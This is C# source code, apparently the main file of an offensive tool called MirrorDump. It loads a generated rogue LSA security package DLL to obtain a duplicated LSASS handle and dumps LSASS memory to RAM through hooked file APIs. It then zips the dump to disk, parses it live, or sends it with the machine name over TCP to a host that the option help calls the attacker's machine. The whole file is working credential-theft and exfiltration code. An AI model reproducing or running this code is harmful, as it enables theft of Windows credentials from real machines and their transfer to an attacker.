using MirrorDump.Lsa;
using Mono.Options;
using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using static MirrorDump.MiniDumpToMem;
using static MirrorDump.ProcessUtility;
using static MirrorDump.WinAPI;

namespace MirrorDump {
    class Program {

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(
             uint processAccess,
             bool bInheritHandle,
             int processId);

        static IntPtr MagicHandle = new IntPtr(0x5555555);

        static void SaveZip(string fileName, DumpContext dc) {
            using (var fileStream = new FileStream(fileName, FileMode.Create, FileAccess.ReadWrite)) {
                using (var archive = new ZipArchive(fileStream, ZipArchiveMode.Create, true)) {
                    var lsassDump = archive.CreateEntry($"{Guid.NewGuid()}.dmp");

                    using (var entryStream = lsassDump.Open()) {
                        using (var streamWriter = new BinaryWriter(entryStream)) {
                            streamWriter.Write(dc.Data, 0, (int)dc.Size);
                        }
                    }
                }
            }
        }

        static void SendZip(string host, int port, DumpContext dc)
        {
            using (var outStream = new MemoryStream())
            {
                using (var archive = new ZipArchive(outStream, ZipArchiveMode.Create, true))
                {
                    var lsassDump = archive.CreateEntry($"{Guid.NewGuid()}.bin");
                    using (var entryStream = lsassDump.Open())
                        using (var dumpCompressStream = new MemoryStream(dc.Data))
                            dumpCompressStream.CopyTo(entryStream);
                }

                byte[] compressedBytes = outStream.ToArray();

                Console.WriteLine($"[+] Minidump successfully packed in memory, size {Math.Round(compressedBytes.Length / 1024.0 / 1024.0, 2)} MB");

                byte[] zipHashBytes = MD5.Create().ComputeHash(compressedBytes);
                string zipHash = BitConverter.ToString(zipHashBytes).Replace("-", "");

                Console.WriteLine($"[*] MD5: {zipHash}");

                using (var tcpClient = new TcpClient(host, port))
                {
                    using (var netStream = tcpClient.GetStream())
                    {
                        string hostName = System.Environment.GetEnvironmentVariable("COMPUTERNAME");
                        string zipSize = (compressedBytes.Length).ToString();
                        byte[] stage = Encoding.ASCII.GetBytes($"{hostName}|{zipSize}");
                        netStream.Write(stage, 0, stage.Length);
                        netStream.Write(compressedBytes, 0, compressedBytes.Length);
                    }
                }
            }
        }

        static ProcessHandle FindLsassHandle() {
            var procHandles = ProcessUtility.GetProcessHandles(Process.GetCurrentProcess());
            foreach (var procHandle in procHandles) {
                if (procHandle.Process?.ProcessName == "lsass") {
                    return procHandle;
                }
            }
            return null;
        }

        static void Main(string[] args) {

            uint limit = 0;
            string fileName = "lsass.zip";
            string dllName = "LsaProviderDuper.dll";
            string host = "";
            int port = -1;
            bool parse = false;
            bool showHelp = false;

            OptionSet option_set = new OptionSet()
                 .Add("f=|filename=", "Output path for generated zip file", v => fileName = v)
                 .Add("d=|dllName", "Output LSA DLL name", v => dllName = v)
                 .Add("l=|limit=", "The maximum amount of memory the minidump is allowed to consume", v => limit = uint.Parse(v))
                 .Add("host=", "IP or a hostname of the attacker's machine (if specified the dump will be sent to attacker over TCP)", v => host = v)
                 .Add("port=", "Port number for the minidump to be sent to (must be used with --host option)", v => port = int.Parse(v))
                 .Add("p|parse", "Parse the minidump online without touching the disk (uses https://github.com/cube0x0/MiniDump)", v => parse = v != null)
                 .Add("h|help", "Display this help", v => showHelp = v != null);

            try {

                option_set.Parse(args);

                if (fileName == null)
                    showHelp = true;

                if (showHelp) {
                    option_set.WriteOptionDescriptions(Console.Out);
                    return;
                }

            } catch (Exception e) {
                Console.WriteLine("[!] Failed to parse arguments: {0}", e.Message);
                option_set.WriteOptionDescriptions(Console.Out);
                return;
            }

            //Generate our LSA plugin DLL that will duplicate lsass handle into this process
            Console.Write($"[+] Generating new LSA DLL {dllName} targeting PID {Process.GetCurrentProcess().Id}.....");
            LsaAssembly.GenerateLsaPlugin(dllName);
            Console.WriteLine($"Done.");
            
            //Load our LSA plugin. This will actually return a failiure due to us
            //not implementing a correct LSA plugin, but it's enough to duplicate the handle
            SECURITY_PACKAGE_OPTIONS spo = new SECURITY_PACKAGE_OPTIONS();
            AddSecurityPackage(new FileInfo(dllName).FullName, spo);                 
            Console.WriteLine("[+] LSA security package loaded, searching current process for duplicated LSASS handle");

            //Now search this process for the duplicated handle that the LSA plugin done on our behalf
            var procHandle = FindLsassHandle();
            if(procHandle != null) {
                Console.WriteLine($"[+] Found duplicated LSASS process handle 0x{procHandle.Handle.ToInt64():x}");
            } else {
                Console.WriteLine($"[!] Failed to get LSASS handle, bailing!");
                return;
            }            

            //http://cybernigma.blogspot.com/2014/03/using-sspap-lsass-proxy-to-mitigate.html
            //It actually has no effect what so ever, so only a reboot will get rid of the DLL from LSASS
            DeleteSecurityPackage(new FileInfo(dllName).FullName);
              
            //OK, first part done.  We have our LSASS handle.  Now lets perform our dump in memory
            //by hook the relevant file writing API's and redirect to memory
            MiniDumpToMem.InitHookEngine(MagicHandle, limit, procHandle.Process.Id, procHandle.Handle);

            Console.Write("[=] Dumping LSASS memory");

            if (!MiniDumpWriteDump(procHandle.Handle, (uint)procHandle.Process.Id, MagicHandle, MINIDUMP_TYPE.MiniDumpWithFullMemory, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero)) {
                if (Marshal.GetLastWin32Error() == ERROR_DISK_FULL) {
                    Console.WriteLine("\n[!] Minidump memory limit reached, could not create dump");
                } else {
                    Console.WriteLine($"\n[!] Minidump generation failed with error 0x{Marshal.GetHRForLastWin32Error():x}");
                }
            } else {
                Console.WriteLine($"\n[+] Minidump successfully saved to memory, size {Math.Round(MiniDumpToMem.GetDumpContextFromHandle(MagicHandle).Size / 1024.0 / 1024.0, 2)}MB");
            }

            //All done, lets clean up and zip our dump for demo purposes
            CloseHandle(procHandle.Handle);
            MiniDumpToMem.ShutdownHookEngine();

            //Get the dump contents
            DumpContext dc = MiniDumpToMem.GetDumpContextFromHandle(MagicHandle);

            //Now we can parse the dump live (may not work on some systems)
            if (parse)
            {
                Console.WriteLine("[*] Parsing minidump...");
                Minidump.Program.Main(dc.Data);
            }
            //Save the zip locally
            else if (port == -1)
            {
                SaveZip(fileName, dc);
                Console.WriteLine($"[+] Minidump saved to {fileName}");
            }
            //Or send it over TCP
            else
            {
                try
                {
                    SendZip(host, port, dc);
                    Console.WriteLine($"[+] Minidump sent to {host}:{port}");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[-] Error sending data: {ex.Message}");
                    Console.WriteLine(ex.StackTrace);
                }
            }
        }
    }
}
